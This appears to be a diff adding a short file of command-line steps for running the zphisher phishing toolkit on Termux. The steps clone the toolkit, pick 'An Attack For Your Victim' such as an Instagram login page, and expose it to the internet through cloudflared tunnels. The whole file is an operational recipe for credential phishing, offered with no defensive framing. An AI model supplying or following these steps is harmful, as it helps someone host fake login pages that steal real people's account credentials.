@@ -1,0 +1,36 @@
+   pkg update
+
+pkg upgrade
+
+Y
+
+pkg install git
+
+Y
+
+git clone https://github.com/htr-tech/zphisher.git
+
+cd zphisher
+
+bash zphisher.sh
+
+Select An Attack For Your Victim eg,(02 Instagram)
+
+Select an option 03
+
+Select a port forwarding service always
+choose (01 Localhost)
+
+Do You Want A Custom Port (N)
+
+After Successfully Hosted Open a new session
+
+pkg install cloudflared
+
+cloudflared tunnel --url localhost:8080
+
+Ctrl C
+
+cloudflared tunnel --url localhost:8080 --no-quic
+
+cloudflared tunnel --url http://localhost:8080 --protocol http2
